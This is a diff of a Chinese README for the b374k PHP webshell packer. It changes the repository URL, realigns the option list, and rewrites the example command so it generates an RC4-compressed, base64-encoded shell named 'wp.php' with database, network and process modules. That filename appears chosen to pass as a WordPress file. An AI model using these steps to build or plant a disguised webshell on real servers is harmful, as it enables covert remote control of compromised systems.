@@ -31,7 +31,7 @@ b374k shell是一个可装卸的模块化webshell，你需要进行一些简单�
 下载b374k项目，你可以在命令行下运行index.php，查看其帮助文档：
 
 ```
-git clone https://github.com/phith0n/b374k.git
+git clone https://github.com/zhkl0228/b374k.git
 cd b374k
 php -f index.php -- --help
 ```
@@ -43,23 +43,23 @@ $ php -f index.php
 b374k shell packer 0.4
 
 options :
-        -o filename                             指定生成文件名
-        -p password                             指定webshell密码
-        -t theme                                指定皮肤
-        -m modules                              指定模块，多个模块间用英文逗号分隔
-        -s                                      是否清楚空白字符和注释
-        -b                                      是否使用base64编码
+        -o filename                                 指定生成文件名
+        -p password                                 指定webshell密码
+        -t theme                                    指定皮肤
+        -m modules                                  指定模块，多个模块间用英文逗号分隔
+        -s                                          是否清楚空白字符和注释
+        -b                                          是否使用base64编码
         -z [no|gzdeflate|gzencode|gzcompress|rc4]   使用哪个压缩方式（需要开启 -b）
-        -c [0-9]                                压缩等级
-        -l                                      列出所有可用的模块
-        -k                                      列出所有可用的皮肤
-        -u code                                 指定目标系统编码，如gb2312/utf-8等，默认utf-8
+        -c [0-9]                                    压缩等级
+        -l                                          列出所有可用的模块
+        -k                                          列出所有可用的皮肤
+        -u code                                     指定目标系统编码，如gb2312/utf-8等，默认utf-8
 ```
 
 例子：
 
 ```
-php -f index.php -- -o myShell.php -p myPassword -s -b -z gzcompress -c 9
+php -f index.php -- -o wp.php -p b374k -s -b -z rc4 -c 9 -m convert,database,info,network,processes -t bluebook -u utf-8
 ```
 
 或者，你可以直接从浏览器访问index.php，使用图形化界面生成你的webshell：
